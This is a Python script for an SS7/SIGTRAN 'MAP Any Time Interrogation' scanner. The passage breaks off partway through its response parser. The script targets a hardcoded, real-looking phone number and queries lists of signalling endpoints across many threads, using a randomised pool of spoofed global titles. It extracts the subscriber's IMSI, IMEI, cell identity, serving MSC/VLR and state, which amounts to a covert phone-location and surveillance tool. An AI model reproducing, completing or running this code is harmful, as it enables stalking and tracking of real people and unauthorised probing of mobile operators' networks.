#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Enhanced MAP-ATI Scanner v5.0 - Professional Edition with Fixed Encoding
=====================================================================

Fixed MAP Any Time Interrogation scanner with proper ASN.1 encoding
and comprehensive error handling with colorful terminal output.

Author: Enhanced Professional Edition for donex1888
Date: 2025-06-04
Version: 5.0.0-PROFESSIONAL-FIXED
Current Date and Time (UTC): 2025-06-04 01:42:22
Current User's Login: donex1888
"""

import socket
import struct
import binascii
import os
import sys
import time
import random
import logging
from pathlib import Path
from datetime import datetime, timezone
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import json
from enum import Enum
import hashlib
from typing import Dict, List, Optional, Union, Tuple, Any
from contextlib import contextmanager
from copy import deepcopy
import re
from dataclasses import dataclass, asdict
from collections import defaultdict, Counter
import traceback

# === Enhanced Color Terminal Output ===
class Colors:
    """Professional ANSI Color codes for terminal output"""
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    
    # Standard colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    # Bright colors
    BRIGHT_BLACK = '\033[90m'
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    
    # Background colors
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    
    # Bright background colors
    BG_BRIGHT_BLACK = '\033[100m'
    BG_BRIGHT_RED = '\033[101m'
    BG_BRIGHT_GREEN = '\033[102m'
    BG_BRIGHT_YELLOW = '\033[103m'
    BG_BRIGHT_BLUE = '\033[104m'
    BG_BRIGHT_MAGENTA = '\033[105m'
    BG_BRIGHT_CYAN = '\033[106m'
    BG_BRIGHT_WHITE = '\033[107m'

def print_colored(message: str, color: str = Colors.WHITE, bold: bool = False, 
                 bg: str = None, italic: bool = False, underline: bool = False):
    """Print colored message to terminal with advanced formatting"""
    output = ""
    if bold:
        output += Colors.BOLD
    if italic:
        output += Colors.ITALIC
    if underline:
        output += Colors.UNDERLINE
    if bg:
        output += bg
    output += color + message + Colors.RESET
    print(output)

def print_professional_banner():
    """Print enhanced professional banner"""
    print_colored("="*100, Colors.BRIGHT_CYAN, bold=True)
    print_colored("🚀 Enhanced MAP-ATI Scanner v5.0 - Professional Edition with Fixed Encoding", Colors.BRIGHT_GREEN, bold=True)
    print_colored("="*100, Colors.BRIGHT_CYAN, bold=True)
    print_colored(f"📅 Current Date and Time (UTC): {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}", Colors.YELLOW)
    print_colored(f"👤 Current User's Login: donex1888", Colors.YELLOW)
    print_colored(f"🔧 Professional Edition - Fixed MAP Parameter Encoding", Colors.CYAN, bold=True)
    print_colored(f"✅ Enhanced Error Handling & Colorful Terminal Output", Colors.GREEN)
    print_colored("="*100, Colors.BRIGHT_CYAN, bold=True)

# === Enhanced Data Classes ===
class AtiVariant(Enum):
    STANDARD = "Standard"
    LOCATION_ONLY = "LocationOnly"
    SUBSCRIBER_STATE = "SubscriberState"
    EQUIPMENT_STATUS = "EquipmentStatus"
    ALL_INFO = "AllInfo"
    MINIMAL = "Minimal"
    LOCATION_EPS = "LocationEPS"
    USER_CSG = "UserCSG"

@dataclass
class EnhancedLocationInfo:
    """Comprehensive location information container"""
    # Basic location
    mcc: str = "N/A"
    mnc: str = "N/A"
    lac: str = "N/A"
    cell_id: str = "N/A"
    
    # Extended location
    rac: str = "N/A"
    service_area_code: str = "N/A"
    location_age: str = "N/A"
    geographical_info: str = "N/A"
    location_number: str = "N/A"
    
    # Network elements
    vlr_name: str = "N/A"
    msc_name: str = "N/A"
    sgsn_name: str = "N/A"
    gmlc_name: str = "N/A"
    mme_name: str = "N/A"
    
    # Status flags
    cgi_found: bool = False
    lai_found: bool = False
    sai_found: bool = False
    
    # Advanced location
    current_location_retrieved: bool = False
    ps_subscriber_state: str = "N/A"
    location_information_age: int = -1
    
    # EPS location
    eps_location_info: str = "N/A"
    user_csg_info: str = "N/A"

@dataclass
class EnhancedSubscriberInfo:
    """Comprehensive subscriber information container"""
    # Identity
    imsi: str = "N/A"
    msisdn: str = "N/A"
    imei: str = "N/A"
    
    # Status
    subscriber_state: str = "N/A"
    equipment_status: str = "N/A"
    
    # Services
    camel_subscription_info: str = "N/A"
    call_forwarding_data: str = "N/A"
    call_barring_info: str = "N/A"
    
    # Advanced info
    odb_info: str = "N/A"
    roaming_restriction: str = "N/A"
    subscriber_status: str = "N/A"
    operator_determined_barring: str = "N/A"
    
    # Network capabilities
    supported_features: List[str] = None
    
    # Additional subscriber data
    bearer_service_list: List[str] = None
    teleservice_list: List[str] = None
    provisioned_ss: List[str] = None
    
    def __post_init__(self):
        if self.supported_features is None:
            self.supported_features = []
        if self.bearer_service_list is None:
            self.bearer_service_list = []
        if self.teleservice_list is None:
            self.teleservice_list = []
        if self.provisioned_ss is None:
            self.provisioned_ss = []

@dataclass
class ScanResult:
    """Professional scan result container with enhanced details"""
    # Basic info
    ip: str = ""
    port: int = 0
    timestamp: str = ""
    duration_ms: float = 0.0
    
    # Status
    success: bool = False
    tcap_outcome: str = "NotStarted"
    error_info: str = "N/A"
    error_code: Optional[int] = None
    rejection_cause: str = "N/A"
    
    # MAP specific
    map_version: str = "N/A"
    application_context: str = "N/A"
    
    # Transaction
    sent_otid: str = ""
    received_dtid: str = "N/A"
    ati_variant_used: str = ""
    attempt_number: int = 1
    
    # Data
    location_info: EnhancedLocationInfo = None
    subscriber_info: EnhancedSubscriberInfo = None
    
    # Technical
    used_cgpa_ssn: int = 0
    used_cgpa_gt: str = ""
    used_sccp_pc: int = 0
    raw_response_hex: str = ""
    parsed_data_size: int = 0
    
    # Connection details
    connection_time_ms: float = 0.0
    response_time_ms: float = 0.0
    bytes_sent: int = 0
    bytes_received: int = 0
    
    def __post_init__(self):
        if self.location_info is None:
            self.location_info = EnhancedLocationInfo()
        if self.subscriber_info is None:
            self.subscriber_info = EnhancedSubscriberInfo()

# === Professional Dependency Management ===
def initialize_professional_dependencies():
    """Professional dependency initialization with enhanced error handling"""
    print_colored("🔧 Initializing professional dependencies...", Colors.YELLOW, bold=True)
    
    dependencies = {}
    
    # Essential SCTP
    try:
        import sctp
        dependencies['sctp'] = sctp
        print_colored("✅ SCTP library loaded successfully", Colors.GREEN)
    except ImportError:
        print_colored("❌ CRITICAL: 'sctp' library not found. Install with: pip install pysctp", Colors.RED, bold=True)
        sys.exit(1)

    # Hexdump for debugging
    try:
        import hexdump
        dependencies['hexdump'] = hexdump
        print_colored("✅ Hexdump library loaded", Colors.GREEN)
    except ImportError:
        dependencies['hexdump'] = None
        print_colored("⚠️  Warning: hexdump not found. Basic hex output will be used.", Colors.YELLOW)

    return dependencies

def initialize_pycrate_professional():
    """Professional Pycrate initialization with comprehensive module loading and proper ASN.1 handling"""
    print_colored("🔧 Initializing Pycrate Professional Edition with Fixed Encoding...", Colors.YELLOW, bold=True)
    
    try:
        # Core ASN.1 Runtime
        from pycrate_asn1rt.err import ASN1Err, ASN1ObjErr
        from pycrate_asn1rt.asnobj_basic import OID, INT, NULL, ASN1Obj, BOOL
        from pycrate_asn1rt.asnobj_str import OCT_STR, BIT_STR
        from pycrate_asn1rt.asnobj_construct import SEQ, CHOICE, SEQ_OF, SET
        from pycrate_asn1rt.codecs import ASN1CodecBER
        print_colored("✅ Pycrate ASN.1 runtime loaded with proper NULL support", Colors.GREEN)
        
        # Mobile protocol modules
        from pycrate_mobile import SCCP
        print_colored("✅ SCCP module loaded", Colors.GREEN)
        
        # MAP Data Types - Professional loading with fallbacks
        MAP_defs = None
        map_load_success = False
        
        # Primary attempt: pycrate_asn1dir.TCAP_MAPv2v3
        try:
            from pycrate_asn1dir import TCAP_MAPv2v3 as MAP_module
            if hasattr(MAP_module, 'MAP_MS_DataTypes'):
                MAP_defs = MAP_module
                map_load_success = True
                print_colored("✅ MAP data types loaded from TCAP_MAPv2v3", Colors.GREEN)
        except ImportError:
            pass
        
        # Secondary attempt: pycrate_mobile.MAP
        if not map_load_success:
            try:
                from pycrate_mobile import MAP as MAP_fallback
                if hasattr(MAP_fallback, 'MAP_MS_DataTypes'):
                    MAP_defs = MAP_fallback
                    map_load_success = True
                    print_colored("✅ MAP data types loaded from pycrate_mobile.MAP", Colors.GREEN)
            except ImportError:
                pass
        
        if not map_load_success:
            print_colored("❌ Failed to load MAP data types from all sources", Colors.RED, bold=True)
            sys.exit(1)
        
        # TCAP Definitions with enhanced loading
        TCAP_defs = None
        tcap_load_success = False
        
        # Use provided TCAP2 module
        try:
            # Import the TCAP2 module from the provided file
            import importlib.util
            tcap_spec = importlib.util.spec_from_file_location("TCAP2", "TCAP2.py")
            if tcap_spec and tcap_spec.loader:
                TCAP2 = importlib.util.module_from_spec(tcap_spec)
                tcap_spec.loader.exec_module(TCAP2)
                if hasattr(TCAP2, 'TCAPMessages'):
                    TCAP_defs = TCAP2.TCAPMessages
                    tcap_load_success = True
                    print_colored("✅ TCAP definitions loaded from TCAP2.py", Colors.GREEN)
        except Exception as e:
            print_colored(f"⚠️  Could not load TCAP2.py: {e}", Colors.YELLOW)
        
        # Fallback TCAP loading
        if not tcap_load_success:
            try:
                from pycrate_asn1dir import TCAP_defs as TCAP_module
                if hasattr(TCAP_module, 'TCMessage'):
                    TCAP_defs = TCAP_module
                    tcap_load_success = True
                    print_colored("✅ TCAP definitions loaded from TCAP_defs", Colors.GREEN)
            except ImportError:
                pass
        
        if not tcap_load_success:
            print_colored("❌ Failed to load TCAP definitions", Colors.RED, bold=True)
            sys.exit(1)
        
        print_colored("✅ All Pycrate components initialized successfully with proper ASN.1 support", Colors.BRIGHT_GREEN, bold=True)
        
        return {
            'SCCP': SCCP,
            'MAP_defs': MAP_defs,
            'TCAP_defs': TCAP_defs,
            'ASN1Err': ASN1Err,
            'ASN1ObjErr': ASN1ObjErr,
            'ASN1CodecBER': ASN1CodecBER,
            'OCT_STR': OCT_STR,
            'BIT_STR': BIT_STR,
            'SEQ': SEQ,
            'CHOICE': CHOICE,
            'SET': SET,
            'INT': INT,
            'NULL': NULL,
            'BOOL': BOOL
        }
        
    except Exception as e:
        print_colored(f"❌ Pycrate initialization error: {e}", Colors.RED, bold=True)
        traceback.print_exc()
        sys.exit(1)

# Initialize professional dependencies
DEPS = initialize_professional_dependencies()
PYCRATE = initialize_pycrate_professional()

# === Professional Constants ===
MAP_OP_ANY_TIME_INTERROGATION = 71

# Enhanced Configuration with more options
PROFESSIONAL_CONFIG = {
    'target_msisdn': "212681364829",
    'ips_file': "ips.txt",
    'results_dir': "professional_results_v5",
    'max_workers': 30,
    'sctp_timeout': 15,
    'sctp_ppid': 0,
    'sctp_ports': [2905, 2906, 2907, 2908, 2909, 2910],
    'retry_attempts': 3,
    'retry_delay': 2.5,
    'gt_pool_size': 1000,
    'chunk_size': 10000,
    'connection_timeout': 8,
    'response_timeout': 12
}

# Professional SCCP Configuration with more SSNs
SCCP_PROFESSIONAL = {
    'cdpa_ssn': 149,
    'cdpa_tt': 0,
    'cdpa_np': 1,
    'cdpa_nai': 4,
    'cdpa_es': 1,
    'cgpa_ssn_pool': [6, 7, 8, 9, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156],
    'cgpa_gt_digits': "212600000000",
    'cgpa_tt': 0,
    'cgpa_np': 1,
    'cgpa_nai': 4,
    'cgpa_es': 1,
    'sccp_proto_class_pool': [0, 1]
}

# Enhanced TCAP Tags
TCAP_TAGS = {
    'DTID': 0x48,
    'OTID': 0x49,
    'COMPONENT_PORTION': 0x6C,
    'MSG_END': 0x65,
    'MSG_CONTINUE': 0x64,
    'MSG_BEGIN': 0x60,
    'MSG_ABORT': 0x67,
    'COMP_INVOKE': 0xA1,
    'COMP_RETURN_RESULT_LAST': 0xA2,
    'COMP_RETURN_ERROR': 0xA3,
    'COMP_REJECT': 0xA4,
    'DIALOGUE_PORTION': 0x6B,
    'USER_INFORMATION': 0x28,
    'DIALOGUE_REQUEST': 0x60,
    'DIALOGUE_RESPONSE': 0x61,
    'DIALOGUE_ABORT': 0x64
}

# Comprehensive MAP Error Codes with detailed descriptions
MAP_ERRORS = {
    1: "Unknown Subscriber - IMSI not recognized",
    3: "Unknown MSC - MSC not in network",
    5: "Unidentified Subscriber - Subscriber identity issue",
    6: "Absent Subscriber SM - Subscriber not reachable for SMS",
    8: "Unknown Equipment - IMEI not recognized",
    9: "Roaming Not Allowed - Roaming restrictions active",
    10: "Illegal Subscriber - Subscriber barred from service",
    11: "Bearer Service Not Provisioned - Service not available",
    12: "Teleservice Not Provisioned - Teleservice not subscribed",
    13: "Illegal Equipment - IMEI blacklisted",
    21: "Facility Not Supported - Feature not implemented",
    27: "Absent Subscriber - Subscriber not reachable",
    28: "Incompatible Terminal - Terminal incompatibility",
    29: "Not Reachable - Subscriber unreachable",
    34: "System Failure - Network system error",
    35: "Data Missing - Required data not available",
    36: "Unexpected Data Value - Invalid parameter value",
    37: "Facility Not Supported - Operation not supported",
    44: "Number Changed - MSISDN has been changed",
    45: "Busy Subscriber - Subscriber busy",
    49: "ATI Not Allowed - ATI operation not permitted",
    50: "ATSI Not Allowed - ATSI operation not permitted",
    51: "ATM Not Allowed - ATM operation not permitted",
    52: "Information Not Available - Requested info unavailable",
    53: "Unauthorized Requesting Network - Network not authorized",
    54: "Unauthorized LCS Client - LCS client not authorized",
    55: "Position Method Failure - Positioning failed",
    58: "Unknown Or Unreachable LCS Client - LCS client issue",
    59: "MM Event Not Supported - Mobility management event error"
}

# Enhanced TCAP Reject Causes
TCAP_REJECT_CAUSES = {
    0: "General Problem - Unrecognized Component",
    1: "General Problem - Mistyped Component",
    2: "General Problem - Badly Structured Component",
    16: "Invoke Problem - Duplicate Invoke ID",
    17: "Invoke Problem - Unrecognized Operation",
    18: "Invoke Problem - Mistyped Parameter",
    19: "Invoke Problem - Resource Limitation",
    20: "Invoke Problem - Initiating Release",
    21: "Invoke Problem - Unrecognized Linked ID",
    22: "Invoke Problem - Linked Response Unexpected",
    23: "Invoke Problem - Unexpected Linked Operation",
    32: "Return Result Problem - Unrecognized Invoke ID",
    33: "Return Result Problem - Return Result Unexpected",
    34: "Return Result Problem - Mistyped Parameter",
    48: "Return Error Problem - Unrecognized Invoke ID",
    49: "Return Error Problem - Return Error Unexpected",
    50: "Return Error Problem - Unrecognized Error",
    51: "Return Error Problem - Unexpected Error",
    52: "Return Error Problem - Mistyped Parameter"
}

# Professional Statistics with more metrics
PROFESSIONAL_STATS = {
    'total_attempts': 0,
    'successful_responses': 0,
    'full_info_extractions': 0,
    'imsi_extractions': 0,
    'imei_extractions': 0,
    'location_extractions': 0,
    'subscriber_state_extractions': 0,
    'network_info_extractions': 0,
    'timeouts': 0,
    'connection_errors': 0,
    'parse_errors': 0,
    'map_errors': 0,
    'tcap_rejects': 0,
    'tcap_aborts': 0,
    'parameter_errors': 0,
    'start_time': None,
    'error_breakdown': defaultdict(int),
    'success_rate': 0.0,
    'data_richness_score': 0.0,
    'average_response_time': 0.0,
    'fastest_response': float('inf'),
    'slowest_response': 0.0
}

# Threading locks
main_csv_lock = threading.Lock()
stats_lock = threading.Lock()
terminal_lock = threading.Lock()
logger = None

# === Professional GT Pool Management ===
class ProfessionalGTPool:
    """Professional Global Title Pool with intelligent distribution"""
    
    def __init__(self, base_gt: str, pool_size: int = 1000):
        self.base_gt = base_gt
        self.pool_size = pool_size
        self.gt_pool = []
        self.current_index = 0
        self.lock = threading.Lock()
        self.usage_stats = defaultdict(int)
        self._generate_professional_pool()
        print_colored(f"✅ Professional GT Pool initialized with {pool_size} entries", Colors.GREEN)
    
    def _generate_professional_pool(self):
        """Generate professional GT pool with enhanced randomization"""
        base_digits = re.sub(r'[^\d]', '', self.base_gt)
        
        for i in range(self.pool_size):
            # Enhanced randomization strategy
            timestamp_part = str(int(time.time() * 1000000))[-8:]
            random_part = f"{random.randint(10000000, 99999999)}"
            sequence_part = f"{i:06d}"
            
            # Combine and ensure uniqueness
            full_gt = base_digits + timestamp_part + random_part + sequence_part
            
            # Ensure proper length (11-15 digits)
            if len(full_gt) > 15:
                full_gt = full_gt[-15:]
            elif len(full_gt) < 11:
                full_gt = full_gt.ljust(11, '0')
            
            self.gt_pool.append(full_gt)
    
    def get_next_gt(self) -> str:
        """Get next GT with intelligent distribution"""
        with self.lock:
            gt = self.gt_pool[self.current_index]
            self.usage_stats[gt] += 1
            self.current_index = (self.current_index + 1) % self.pool_size
            return gt

# Initialize Professional GT Pool
gt_pool = None

# === Professional Utility Functions ===

def setup_professional_logging(log_file: Path, log_level: str = "INFO") -> logging.Logger:
    """Setup professional logging with enhanced formatting"""
    logger = logging.getLogger("professional_map_scanner_v5")
    logger.handlers.clear()
    logger.setLevel(logging.DEBUG)
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_formatter = logging.Formatter('%(message)s')
    console_handler.setFormatter(console_formatter)
    console_handler.setLevel(getattr(logging, log_level.upper()))
    logger.addHandler(console_handler)
    
    # Professional file handler
    file_handler = logging.FileHandler(log_file, mode='a', encoding='utf-8')
    file_formatter = logging.Formatter(
        '%(asctime)s.%(msecs)03d-%(levelname)-8s-[%(threadName)-12s]-%(funcName)-20s:%(lineno)-4d-%(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    file_handler.setFormatter(file_formatter)
    file_handler.setLevel(logging.DEBUG)
    logger.addHandler(file_handler)
    
    return logger

def decode_plmn_professional(plmn_bytes: bytes) -> Tuple[str, str]:
    """Professional PLMN decoder with comprehensive validation"""
    if len(plmn_bytes) != 3:
        raise ValueError(f"PLMN must be exactly 3 bytes, got {len(plmn_bytes)}")
    
    byte1, byte2, byte3 = plmn_bytes
    
    # Extract nibbles with BCD decoding
    mcc_digit1 = (byte1 >> 4) & 0x0F
    mcc_digit2 = byte1 & 0x0F
    mcc_digit3 = (byte2 >> 4) & 0x0F
    
    mnc_digit1 = (byte3 >> 4) & 0x0F
    mnc_digit2 = byte3 & 0x0F
    mnc_digit3 = byte2 & 0x0F
    
    # Validate MCC
    if any(d > 9 for d in [mcc_digit1, mcc_digit2, mcc_digit3]):
        raise ValueError(f"Invalid MCC digits: {mcc_digit1}{mcc_digit2}{mcc_digit3}")
    
    mcc = f"{mcc_digit1}{mcc_digit2}{mcc_digit3}"
    
    # Build MNC
    if mnc_digit3 == 0xF:
        # 2-digit MNC
        if any(d > 9 for d in [mnc_digit1, mnc_digit2]):
            raise ValueError(f"Invalid 2-digit MNC: {mnc_digit1}{mnc_digit2}")
        mnc = f"{mnc_digit1}{mnc_digit2}"
    else:
        # 3-digit MNC
        if any(d > 9 for d in [mnc_digit1, mnc_digit2, mnc_digit3]):
            raise ValueError(f"Invalid 3-digit MNC: {mnc_digit1}{mnc_digit2}{mnc_digit3}")
        mnc = f"{mnc_digit1}{mnc_digit2}{mnc_digit3}"
    
    return mcc, mnc

def decode_tbcd_string(tbcd_bytes: bytes) -> str:
    """Professional TBCD string decoder"""
    if not tbcd_bytes:
        return "N/A"
    
    digits = []
    for byte in tbcd_bytes:
        digit1 = byte & 0x0F
        digit2 = (byte >> 4) & 0x0F
        
        if digit1 <= 9:
            digits.append(str(digit1))
        if digit2 <= 9 and digit2 != 0xF:
            digits.append(str(digit2))
    
    return ''.join(digits) if digits else "N/A"

def print_connection_status(ip: str, port: int, status: str, details: str = "", 
                          color: str = Colors.WHITE, unique_id: str = ""):
    """Print colorful connection status with thread safety"""
    with terminal_lock:
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        
        # Status icons and colors
        status_icons = {
            "CONNECTING": ("🔄", Colors.BLUE),
            "CONNECTED": ("✅", Colors.GREEN),
            "SENDING": ("📤", Colors.CYAN),
            "RECEIVING": ("📥", Colors.MAGENTA),
            "SUCCESS": ("🎯", Colors.BRIGHT_GREEN),
            "PARTIAL_SUCCESS": ("⚡", Colors.YELLOW),
            "ERROR": ("❌", Colors.RED),
            "TIMEOUT": ("⏰", Colors.YELLOW),
            "REJECTED": ("🚫", Colors.RED),
            "FAILED": ("💥", Colors.BRIGHT_RED),
            "BUILDING": ("🔨", Colors.CYAN),
            "PARSING": ("🔍", Colors.BLUE)
        }
        
        icon, status_color = status_icons.get(status, ("ℹ️", color))
        
        # Format the output
        output_parts = [
            f"{timestamp}",
            f"[{unique_id}]" if unique_id else "",
            f"{icon} {ip}:{port}",
            f"- {status}",
            f"- {details}" if details else ""
        ]
        
        output_line = " ".join(filter(None, output_parts))
        print_colored(output_line, status_color, bold=(status in ["SUCCESS", "FAILED", "ERROR"]))

# === Professional Response Parser ===

def extract_tcap_from_sccp_professional(raw_response: bytes) -> Optional[bytes]:
    """Professional TCAP extraction from SCCP with enhanced validation"""
    if not raw_response or len(raw_response) < 5:
        return None
    
    try:
        # Validate SCCP UDT message
        if raw_response[0] != 0x09:
            return None
        
        # Parse SCCP UDT structure with validation
        if len(raw_response) < 5:
            return None
        
        ptr_data = raw_response[4]
        data_start = 5 + ptr_data - 1
        
        if data_start >= len(raw_response) or data_start < 0:
            return None
        
        if raw_response[data_start] != 0x03:
            return None
        
        if data_start + 1 >= len(raw_response):
            return None
        
        data_length = raw_response[data_start + 1]
        tcap_start = data_start + 2
        
        if tcap_start + data_length > len(raw_response):
            return None
        
        return raw_response[tcap_start:tcap_start + data_length]
        
    except Exception as e:
        if logger:
            logger.debug(f"Professional SCCP parsing error: {e}")
        return None

def decode_ati_response_professional(response_data: bytes, unique_id: str) -> Optional[ScanResult]:
    """Professional MAP ATI response decoder using full Pycrate power"""
    
    if not response_data or len(response_data) < 4:
        return None
    
    try:
        if logger:
            logger.debug(f"[{unique_id}] Professional ATI response decoding started")
        
        # Initialize result
        result = ScanResult()
        result.parsed_data_size = len(response_data)
        
        # Get MAP data types
        MAP_MS_DataTypes = getattr(PYCRATE['MAP_defs'], 'MAP_MS_DataTypes', None)
        if not MAP_MS_DataTypes:
            if logger:
                logger.debug(f"[{unique_id}] MAP_MS_DataTypes not available")
            return None
        
        # Try to get AnyTimeInterrogationRes
        AtiResType = getattr(MAP_MS_DataTypes, 'AnyTimeInterrogationRes', None)
        if not AtiResType:
            if logger:
                logger.debug(f"[{unique_id}] AnyTimeInterrogationRes type not found")
            return None
        
        # Decode the response
        try:
            ati_response = deepcopy(AtiResType)
            ati_response.from_ber(response_data)
            response_val = ati_response.get_val()
            
            if logger:
                logger.info(f"[{unique_id}] Professional MAP response decoded successfully")
            
            # Extract location information
            if 'locationInformation' in response_val:
                result.location_info = parse_location_information_professional(
                    response_val['locationInformation'], unique_id
                )
            
            # Extract subscriber information  
            if 'subscriberInfo' in response_val:
                result.subscriber_info = parse_subscriber_info_professional(
                    response_val['subscriberInfo'], unique_id
                )
            
            # Extract additional MAP information
            if 'extensionContainer' in response_val:
                parse_extension_container_professional(
                    response_val['extensionContainer'], result, unique_id
                )
            
            result.map_version = "v3"  # Assume v3 for successful decode
            result.success = True
            
            return result
            
        except Exception as decode_error:
            if logger:
                logger.debug(f"[{unique_id}] Professional decode error: {decode_error}")
            return None
        
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] Professional ATI response parsing failed: {e}")
        return None

def parse_location_information_professional(location_data: Any, unique_id: str) -> EnhancedLocationInfo:
    """Professional location information parser with enhanced extraction"""
    
    location = EnhancedLocationInfo()
    
    try:
        if isinstance(location_data, dict):
            # Parse Cell Global Identity
            if 'cellGlobalIdOrServiceAreaIdOrLAI' in location_data:
                cgi_data = location_data['cellGlobalIdOrServiceAreaIdOrLAI']
                if isinstance(cgi_data, tuple) and len(cgi_data) >= 2:
                    cgi_type, cgi_value = cgi_data[0], cgi_data[1]
                    
                    if cgi_type == 'cellGlobalIdOrServiceAreaIdFixedLength' and len(cgi_value) >= 7:
                        # Parse CGI
                        try:
                            mcc, mnc = decode_plmn_professional(cgi_value[:3])
                            location.mcc = mcc
                            location.mnc = mnc
                            location.lac = str(int.from_bytes(cgi_value[3:5], 'big'))
                            location.cell_id = str(int.from_bytes(cgi_value[5:7], 'big'))
                            location.cgi_found = True
                            
                            if logger:
                                logger.info(f"[{unique_id}] 🎯 Professional CGI: MCC={mcc}, MNC={mnc}, LAC={location.lac}, CI={location.cell_id}")
                        except Exception as e:
                            if logger:
                                logger.debug(f"[{unique_id}] CGI parsing error: {e}")
            
            # Parse VLR number
            if 'vlr-number' in location_data:
                vlr_data = location_data['vlr-number']
                if isinstance(vlr_data, bytes):
                    location.vlr_name = decode_tbcd_string(vlr_data[1:])  # Skip first byte (nature of address)
            
            # Parse MSC number
            if 'msc-number' in location_data:
                msc_data = location_data['msc-number']
                if isinstance(msc_data, bytes):
                    location.msc_name = decode_tbcd_string(msc_data[1:])
            
            # Parse location age
            if 'ageOfLocationInformation' in location_data:
                location.location_age = str(location_data['ageOfLocationInformation'])
            
            # Parse geographical information
            if 'geographicalInformation' in location_data:
                geo_data = location_data['geographicalInformation']
                if isinstance(geo_data, bytes):
                    location.geographical_info = geo_data.hex()
            
            # Parse location number
            if 'locationNumber' in location_data:
                loc_num_data = location_data['locationNumber']
                if isinstance(loc_num_data, bytes):
                    location.location_number = decode_tbcd_string(loc_num_data[1:])
            
            # Parse SGSN number
            if 'sgsn-number' in location_data:
                sgsn_data = location_data['sgsn-number']
                if isinstance(sgsn_data, bytes):
                    location.sgsn_name = decode_tbcd_string(sgsn_data[1:])
            
            # Parse MME name
            if 'mme-name' in location_data:
                mme_data = location_data['mme-name']
                if isinstance(mme_data, bytes):
                    location.mme_name = decode_tbcd_string(mme_data[1:])
            
            # Set success flags
            if location.mcc != "N/A" and location.mnc != "N/A":
                if location.cell_id != "N/A":
                    location.cgi_found = True
                else:
                    location.lai_found = True
        
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] Professional location parsing error: {e}")
    
    return location

def parse_subscriber_info_professional(subscriber_data: Any, unique_id: str) -> EnhancedSubscriberInfo:
    """Professional subscriber information parser with enhanced extraction"""
    
    subscriber = EnhancedSubscriberInfo()
    
    try:
        if isinstance(subscriber_data, dict):
            # Parse IMSI
            if 'imsi' in subscriber_data:
                imsi_data = subscriber_data['imsi']
                if isinstance(imsi_data, bytes):
                    subscriber.imsi = decode_tbcd_string(imsi_data)
            
            # Parse MSISDN
            if 'msisdn' in subscriber_data:
                msisdn_data = subscriber_data['msisdn']
                if isinstance(msisdn_data, bytes):
                    subscriber.msisdn = decode_tbcd_string(msisdn_data[1:])
            
            # Parse IMEI
            if 'imei' in subscriber_data:
                imei_data = subscriber_data['imei']
                if isinstance(imei_data, bytes):
                    subscriber.imei = decode_tbcd_string(imei_data)
            
            # Parse subscriber state
            if 'subscriberState' in subscriber_data:
                state_data = subscriber_data['subscriberState']
                if isinstance(state_data, tuple) and len(state_data) >= 2:
                    state_type, state_value = state_data[0], state_data[1]
                    subscriber.subscriber_state = f"{state_type}: {state_value}"
                elif isinstance(state_data, int):
                    states = {0: "assumedIdle", 1: "camelBusy", 2: "notProvidedFromVLR"}
                    subscriber.subscriber_state = states.get(state_data, f"unknown({state_data})")
            
            # Parse PS subscriber state
            if 'ps-SubscriberState' in subscriber_data:
                ps_state_data = subscriber_data['ps-SubscriberState']
                subscriber.ps_subscriber_state = str(ps_state_data)
            
            # Parse ODB info
            if 'odb-Info' in subscriber_data:
                odb_data = subscriber_data['odb-Info']
                subscriber.odb_info = str(odb_data)
            
            # Parse roaming restriction
            if 'roamingRestrictionDueToUnsupportedFeature' in subscriber_data:
                subscriber.roaming_restriction = "true"
            
            # Parse bearer service list
            if 'bearerServiceList' in subscriber_data:
                bs_list = subscriber_data['bearerServiceList']
                if isinstance(bs_list, list):
                    subscriber.bearer_service_list = [str(bs) for bs in bs_list]
            
            # Parse teleservice list
            if 'teleserviceList' in subscriber_data:
                ts_list = subscriber_data['teleserviceList']
                if isinstance(ts_list, list):
                    subscriber.teleservice_list = [str(ts) for ts in ts_list]
            
            if logger:
                logger.info(f"[{unique_id}] 📱 Professional subscriber info: IMSI={subscriber.imsi}, State={subscriber.subscriber_state}")
    
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] Professional subscriber parsing error: {e}")
    
    return subscriber

def parse_extension_container_professional(extension_data: Any, result: ScanResult, unique_id: str):
    """Professional extension container parser"""
    try:
        if isinstance(extension_data, dict):
            # Parse private extensions
            if 'privateExtensionList' in extension_data:
                result.subscriber_info.supported_features.append("privateExtensions")
            
            # Parse PCS extensions
            if 'pcs-Extensions' in extension_data:
                result.subscriber_info.supported_features.append("pcsExtensions")
    
    except Exception as e:
        if logger:
            logger.debug(f"[{unique_id}] Extension container parsing error: {e}")

def parse_response_professional(raw_response: bytes, unique_id: str) -> ScanResult:
    """Professional response parser with full Pycrate integration and enhanced error handling"""
    
    result = ScanResult()
    result.tcap_outcome = 'ParseError'
    result.error_info = 'Unknown parsing error'
    
    if not raw_response or len(raw_response) < 5:
        result.error_info = f"Response too short: {len(raw_response)} bytes"
        result.rejection_cause = "Invalid response length"
        return result
    
    result.raw_response_hex = raw_response.hex()
    result.bytes_received = len(raw_response)
    
    try:
